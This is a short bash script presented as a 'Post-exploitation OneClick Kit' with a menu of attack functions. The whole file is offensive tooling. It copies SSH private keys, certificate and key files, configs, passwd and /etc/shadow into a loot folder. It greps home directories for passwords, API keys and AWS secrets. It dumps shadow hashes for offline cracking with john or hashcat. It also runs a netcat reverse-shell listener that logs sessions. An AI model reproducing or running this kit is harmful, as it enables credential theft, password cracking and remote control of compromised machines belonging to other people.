#!/usr/bin/env bash
# kit-post.sh — Post-exploitation OneClick Kit
set -euo pipefail
OUT="$HOME/oneclick_kits/post"
mkdir -p "$OUT/sessions" "$OUT/loot"

function loot_collector() {
  read -rp "Target path to scan (default /home): " tp
  tp=${tp:-/home}
  echo "Collecting common sensitive files from $tp ..."
  find "$tp" -type f \( -iname "*id_rsa*" -o -iname "*.key" -o -iname "*.pem" -o -iname "*.conf" -o -iname "shadow" -o -iname "passwd" \) -exec cp -t "$OUT/loot" {} + 2>/dev/null || true
  echo "Loot copied to $OUT/loot"
}

function creds_extractor() {
  read -rp "Local path to search (default ~): " lp
  lp=${lp:-$HOME}
  echo "Searching for potential creds in dotfiles..."
  grep -RIn --exclude-dir={.git,node_modules} -E "password|passwd|secret|api_key|aws_secret" "$lp" | tee "$OUT/creds_$(date +%s).txt" || true
  echo "Done. Results: $OUT/creds_*.txt"
}

function hashdump() {
  if [[ "$(id -u)" -ne 0 ]]; then
    echo "Нужен root для извлечения хэшей."
    return 1
  fi
  cp /etc/shadow "$OUT/shadow_$(date +%s).txt"
  echo "Shadow copied. Use john/hashcat offline."
}

function reverse_shell_listener() {
  read -rp "Port to listen on: " p
  outfile="$OUT/sessions/session_$(date +%s).log"
  echo "Listening on port $p, saving to $outfile (CTRL+C to stop)"
  nc -lvnp "$p" | tee "$outfile"
}

function menu() {
  while true; do
    cat <<EOF
=== Post-exploitation Kit ===
1) Collect "loot" (keys, confs, id_rsa, shadow etc.)
2) Search for credentials in home/dotfiles
3) Dump /etc/shadow (requires root)
4) Reverse shell listener (nc) -> saves sessions
0) Exit
EOF
    read -rp "Choice: " c
    case $c in
      1) loot_collector;;
      2) creds_extractor;;
      3) hashdump;;
      4) reverse_shell_listener;;
      0) exit 0;;
      *) echo "Bad";;
    esac
  done
}

menu
